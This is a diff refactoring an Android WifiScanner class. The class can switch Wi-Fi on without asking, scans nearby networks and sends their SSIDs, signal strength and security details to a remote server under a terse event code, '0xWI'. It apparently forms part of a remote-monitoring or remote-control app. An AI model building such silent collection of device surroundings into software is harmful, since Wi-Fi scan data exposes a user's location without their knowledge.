@@ -10,8 +10,6 @@ import android.net.wifi.ScanResult;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 
-import androidx.core.content.ContextCompat;
-
 import com.fason.app.core.permissions.PermissionManager;
 import com.fason.app.core.network.SocketClient;
 
@@ -27,18 +25,18 @@ import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 
-public class WifiScanner {
+// WiFi network scanner
+public final class WifiScanner {
 
-    private static final int MAX_NETWORKS = 50;
-    private static final long SCAN_TIMEOUT_MS = 15000; // 15 seconds timeout
+    private static final int MAX = 50;
+    private static final long TIMEOUT = 15000;
+    private static final AtomicBoolean scanning = new AtomicBoolean(false);
+    private static final ExecutorService exec = Executors.newSingleThreadExecutor();
+    private static final AtomicReference<JSONArray> cache = new AtomicReference<>();
 
-    private static final AtomicBoolean isScanning = new AtomicBoolean(false);
-    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
-    private static final AtomicReference<JSONArray> cachedResults = new AtomicReference<>();
+    private WifiScanner() {}
 
-    /**
-     * Perform WiFi scan and return results
-     */
+    // Perform WiFi scan
     public static JSONObject scan(Context ctx) {
         JSONObject result = new JSONObject();
         JSONArray networks = new JSONArray();
@@ -50,34 +48,32 @@ public class WifiScanner {
             LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
 
             if (wm == null) {
-                result.put("error", "WiFi not available");
+                result.put("error", "WiFi unavailable");
                 return result;
             }
 
-            // Check if WiFi is enabled
+            // Check WiFi enabled
             if (!wm.isWifiEnabled()) {
-                // Try to enable WiFi (requires CHANGE_WIFI_STATE permission)
                 if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                     try {
                         wm.setWifiEnabled(true);
-                        Thread.sleep(1000); // Wait for WiFi to enable
+                        Thread.sleep(1000);
                     } catch (Exception ignored) {}
                 }
-
                 if (!wm.isWifiEnabled()) {
                     result.put("error", "WiFi disabled");
                     return result;
                 }
             }
 
-            // Check location permission (required for WiFi scan on Android 6+)
+            // Check location permission
             if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                 !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                 result.put("error", "Location permission required");
                 return result;
             }
 
-            // Check if location is enabled (required on Android 6+)
+            // Check location enabled
             boolean locEnabled = lm != null &&
                 (lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                  lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER));
@@ -87,8 +83,8 @@ public class WifiScanner {
                 return result;
             }
 
-            // Use cached results if available and recent
-            JSONArray cached = cachedResults.get();
+            // Use cache if available
+            JSONArray cached = cache.get();
             if (cached != null && cached.length() > 0) {
                 result.put("networks", cached);
                 result.put("total", cached.length());
@@ -96,18 +92,18 @@ public class WifiScanner {
                 return result;
             }
 
-            // Perform async scan with timeout
-            JSONArray scanResults = performAsyncScan(ctx, wm);
+            // Perform async scan
+            JSONArray scanResults = asyncScan(ctx, wm);
 
             if (scanResults != null && scanResults.length() > 0) {
                 result.put("networks", scanResults);
                 result.put("total", scanResults.length());
-                cachedResults.set(scanResults);
+                cache.set(scanResults);
             } else {
-                // Fallback: try to get cached scan results from system
-                List<ScanResult> systemResults = wm.getScanResults();
-                if (systemResults != null && !systemResults.isEmpty()) {
-                    processResults(systemResults, networks);
+                // Fallback to system cache
+                List<ScanResult> sysResults = wm.getScanResults();
+                if (sysResults != null && !sysResults.isEmpty()) {
+                    process(sysResults, networks);
                     result.put("total", networks.length());
                     result.put("cached", true);
                 } else {
@@ -116,24 +112,18 @@ public class WifiScanner {
             }
 
         } catch (Exception e) {
-            try {
-                result.put("error", e.getMessage());
-            } catch (Exception ignored) {}
+            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
 
         return result;
     }
 
-    /**
-     * Perform async WiFi scan with broadcast receiver
-     */
-    private static JSONArray performAsyncScan(Context ctx, WifiManager wm) {
-        if (!isScanning.compareAndSet(false, true)) {
-            return null; // Already scanning
-        }
+    // Async WiFi scan
+    private static JSONArray asyncScan(Context ctx, WifiManager wm) {
+        if (!scanning.compareAndSet(false, true)) return null;
 
-        final CountDownLatch latch = new CountDownLatch(1);
-        final AtomicReference<JSONArray> results = new AtomicReference<>();
+        CountDownLatch latch = new CountDownLatch(1);
+        AtomicReference<JSONArray> results = new AtomicReference<>();
 
         BroadcastReceiver receiver = new BroadcastReceiver() {
             @Override
@@ -141,22 +131,17 @@ public class WifiScanner {
                 try {
                     List<ScanResult> scanResults = wm.getScanResults();
                     if (scanResults != null && !scanResults.isEmpty()) {
-                        JSONArray networks = new JSONArray();
-                        processResults(scanResults, networks);
-                        results.set(networks);
+                        JSONArray nets = new JSONArray();
+                        process(scanResults, nets);
+                        results.set(nets);
                     }
                 } catch (Exception ignored) {}
-
                 latch.countDown();
-                isScanning.set(false);
-
-                try {
-                    ctx.unregisterReceiver(this);
-                } catch (Exception ignored) {}
+                scanning.set(false);
+                try { ctx.unregisterReceiver(this); } catch (Exception ignored) {}
             }
         };
 
-        // Register receiver
         try {
             IntentFilter filter = new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -165,47 +150,31 @@ public class WifiScanner {
                 ctx.registerReceiver(receiver, filter);
             }
         } catch (Exception e) {
-            isScanning.set(false);
+            scanning.set(false);
             return null;
         }
 
-        // Trigger scan
-        boolean scanStarted = wm.startScan();
-
-        if (!scanStarted) {
-            try {
-                ctx.unregisterReceiver(receiver);
-            } catch (Exception ignored) {}
-            isScanning.set(false);
+        if (!wm.startScan()) {
+            try { ctx.unregisterReceiver(receiver); } catch (Exception ignored) {}
+            scanning.set(false);
             return null;
         }
 
-        // Wait for results with timeout
         try {
-            boolean completed = latch.await(SCAN_TIMEOUT_MS, TimeUnit.MILLISECONDS);
-            if (!completed) {
-                try {
-                    ctx.unregisterReceiver(receiver);
-                } catch (Exception ignored) {}
-            }
-        } catch (InterruptedException e) {
-            try {
-                ctx.unregisterReceiver(receiver);
-            } catch (Exception ignored) {}
+            latch.await(TIMEOUT, TimeUnit.MILLISECONDS);
+        } catch (Exception e) {
+            try { ctx.unregisterReceiver(receiver); } catch (Exception ignored) {}
         }
 
-        isScanning.set(false);
+        scanning.set(false);
         return results.get();
     }
 
-    /**
-     * Process scan results into JSON array
-     */
-    private static void processResults(List<ScanResult> scans, JSONArray networks) {
-        // Sort by signal strength
+    // Process scan results
+    private static void process(List<ScanResult> scans, JSONArray networks) {
         scans.sort(Comparator.comparingInt((ScanResult s) -> s.level).reversed());
 
-        int limit = Math.min(scans.size(), MAX_NETWORKS);
+        int limit = Math.min(scans.size(), MAX);
         for (int i = 0; i < limit; i++) {
             ScanResult sr = scans.get(i);
             try {
@@ -214,25 +183,14 @@ public class WifiScanner {
                 net.put("SSID", sr.SSID != null ? sr.SSID : "");
                 net.put("level", sr.level);
                 net.put("frequency", sr.frequency);
-
-                // Signal strength in percentage (approximate)
-                int signalPercent = calculateSignalStrength(sr.level);
-                net.put("signalStrength", signalPercent);
-
-                // Capabilities (encryption type)
+                net.put("signalStrength", calcSignal(sr.level));
                 net.put("capabilities", sr.capabilities != null ? sr.capabilities : "");
                 net.put("secure", sr.capabilities != null &&
                     (sr.capabilities.contains("WPA") || sr.capabilities.contains("WEP")));
+                net.put("channel", freqToChannel(sr.frequency));
 
-                // Channel (from frequency)
-                net.put("channel", frequencyToChannel(sr.frequency));
-
-                // WiFi 6 support (Android 10+)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                        // Check for WiFi 6 (802.11ax) support
-                        net.put("wifi6", sr.capabilities != null && sr.capabilities.contains("WPA3"));
-                    }
+                    net.put("wifi6", sr.capabilities != null && sr.capabilities.contains("WPA3"));
                 }
 
                 networks.put(net);
@@ -240,39 +198,27 @@ public class WifiScanner {
         }
     }
 
-    /**
-     * Calculate signal strength percentage from dBm
-     */
-    private static int calculateSignalStrength(int rssi) {
-        // RSSI range is typically -100 (weak) to -30 (strong)
-        int percent = (int) ((rssi + 100) * 100.0 / 70);
-        return Math.max(0, Math.min(100, percent));
+    // Calculate signal percentage
+    private static int calcSignal(int rssi) {
+        int pct = (int) ((rssi + 100) * 100.0 / 70);
+        return Math.max(0, Math.min(100, pct));
     }
 
-    /**
-     * Convert frequency to WiFi channel
-     */
-    private static int frequencyToChannel(int freq) {
-        if (freq >= 2412 && freq <= 2484) {
-            return (freq - 2407) / 5;
-        } else if (freq >= 5170 && freq <= 5825) {
-            return (freq - 5170) / 5 + 34;
-        }
+    // Frequency to channel
+    private static int freqToChannel(int freq) {
+        if (freq >= 2412 && freq <= 2484) return (freq - 2407) / 5;
+        if (freq >= 5170 && freq <= 5825) return (freq - 5170) / 5 + 34;
         return freq;
     }
 
-    /**
-     * Clear cached results
-     */
+    // Clear cache
     public static void clearCache() {
-        cachedResults.set(null);
+        cache.set(null);
     }
 
-    /**
-     * Scan and emit results to server
-     */
+    // Scan and emit
     public static void scanAndEmit(Context ctx) {
-        executor.execute(() -> {
+        exec.execute(() -> {
             JSONObject result = scan(ctx);
             SocketClient.getInstance().getSocket().emit("0xWI", result);
         });
